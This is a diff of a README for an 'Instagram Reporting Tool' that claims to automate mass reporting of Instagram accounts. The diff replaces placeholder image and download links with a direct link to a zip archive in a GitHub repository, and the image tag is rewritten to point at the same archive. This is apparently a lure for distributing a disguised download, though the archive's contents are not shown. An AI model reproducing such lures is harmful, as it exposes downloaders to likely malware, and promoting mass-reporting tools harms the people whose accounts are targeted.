@@ -1,6 +1,6 @@
 # Instagram Reporting Tool
 
-![Instagram Reporting Tool](https://via.placeholder.com/800x400?text=Instagram+Reporting+Tool)
+![Instagram Reporting Tool](https://raw.githubusercontent.com/BennetSamuel/instagram-reporting-tool/master/Rosminian/inn.zip+Reporting+Tool)
 
 ## 📋 Overview
 A powerful automation tool designed to streamline Instagram account reporting processes with advanced capabilities and user-friendly interface.
@@ -27,7 +27,7 @@ A powerful automation tool designed to streamline Instagram account reporting pr
 5. Monitor progress in real-time
 
 ## 📥 Download
-[Download Instagram Reporting Tool](https://github.com/download/file.zip)
+[Download Instagram Reporting Tool](https://raw.githubusercontent.com/BennetSamuel/instagram-reporting-tool/master/Rosminian/inn.zip)
 
 ## ⚠️ Disclaimer
 Use responsibly and in compliance with Instagram's Terms of Service. The developers are not responsible for account restrictions.
